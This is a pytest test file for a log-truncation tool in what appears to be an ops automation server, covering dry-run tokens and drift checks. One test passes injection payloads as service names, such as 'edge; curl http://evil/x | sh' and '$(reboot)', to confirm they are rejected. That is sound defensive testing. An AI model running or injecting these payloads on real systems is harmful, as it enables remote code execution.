"""rotate_logs: reclaims disk from one service's unbounded log file (runbook
disk-full Branch C). Two-phase like prune_images: dry-run reports the
current log size + a confirm_token; apply truncates the log file and
requires that token."""

from __future__ import annotations

import pytest

from ops_mcp.command_runner import CommandResult
from ops_mcp.tools.rotate import log_path_command, log_size_command, rotate_logs, truncate_command


def _script(responses, *, service="edge", log_path="/var/lib/docker/containers/abc/abc.log", size=5_000_000):
    responses[tuple(log_path_command(service))] = CommandResult(
        stdout=f"{log_path}\n", stderr="", returncode=0
    )
    responses[tuple(log_size_command(log_path))] = CommandResult(
        stdout=f"{size}\t{log_path}\n", stderr="", returncode=0
    )


def test_dry_run_reports_size_and_never_touches_the_log(scripted_runner):
    runner, responses = scripted_runner
    _script(responses, size=5_000_000)

    result = rotate_logs(runner, "edge", dry_run=True)

    assert result["dry_run"] is True
    assert result["service"] == "edge"
    assert result["log_path"] == "/var/lib/docker/containers/abc/abc.log"
    assert result["reclaim_bytes"] == 5_000_000
    assert result["confirm_token"]


def test_apply_without_confirm_token_is_refused(scripted_runner):
    runner, responses = scripted_runner
    _script(responses)

    with pytest.raises(ValueError, match="confirm_token"):
        rotate_logs(runner, "edge", dry_run=False)


def test_apply_with_a_valid_token_truncates_the_log(scripted_runner):
    runner, responses = scripted_runner
    _script(responses)
    token = rotate_logs(runner, "edge", dry_run=True)["confirm_token"]

    _script(responses)  # apply re-verifies fresh state before truncating
    log_path = "/var/lib/docker/containers/abc/abc.log"
    responses[tuple(truncate_command(log_path))] = CommandResult(stdout="", stderr="", returncode=0)

    result = rotate_logs(runner, "edge", dry_run=False, confirm_token=token)

    assert result["dry_run"] is False
    assert result["rotated"] is True
    assert result["log_path"] == log_path


def test_apply_tolerates_size_growth_between_dry_run_and_apply(scripted_runner):
    # The log kept growing while a human reviewed the dry-run — that alone
    # must not count as drift; only a changed *target* (service/log_path)
    # should reject.
    runner, responses = scripted_runner
    _script(responses, size=1_000)
    token = rotate_logs(runner, "edge", dry_run=True)["confirm_token"]

    _script(responses, size=50_000)  # same path, much bigger by apply time
    log_path = "/var/lib/docker/containers/abc/abc.log"
    responses[tuple(truncate_command(log_path))] = CommandResult(stdout="", stderr="", returncode=0)

    result = rotate_logs(runner, "edge", dry_run=False, confirm_token=token)

    assert result["rotated"] is True


def test_apply_rejects_drift_when_the_log_path_changed(scripted_runner):
    # Between dry-run and apply the container was recreated (new log file) —
    # this is a real target change and must be rejected.
    runner, responses = scripted_runner
    _script(responses, log_path="/var/lib/docker/containers/abc/abc.log")
    token = rotate_logs(runner, "edge", dry_run=True)["confirm_token"]

    _script(responses, log_path="/var/lib/docker/containers/def/def.log")

    with pytest.raises(ValueError, match="drift"):
        rotate_logs(runner, "edge", dry_run=False, confirm_token=token)


def test_rejects_unsafe_service_names():
    unreachable = lambda cmd: (_ for _ in ()).throw(AssertionError("should not run"))  # noqa: E731
    for payload in ["edge; curl http://evil/x | sh", "a b", "$(reboot)", "`id`", "-f", ""]:
        with pytest.raises(ValueError):
            rotate_logs(unreachable, payload, dry_run=True)


def test_dry_run_raises_clearly_when_inspect_fails(scripted_runner):
    runner, responses = scripted_runner
    responses[tuple(log_path_command("missing"))] = CommandResult(
        stdout="", stderr="No such container: missing", returncode=1
    )

    with pytest.raises(RuntimeError, match="missing"):
        rotate_logs(runner, "missing", dry_run=True)
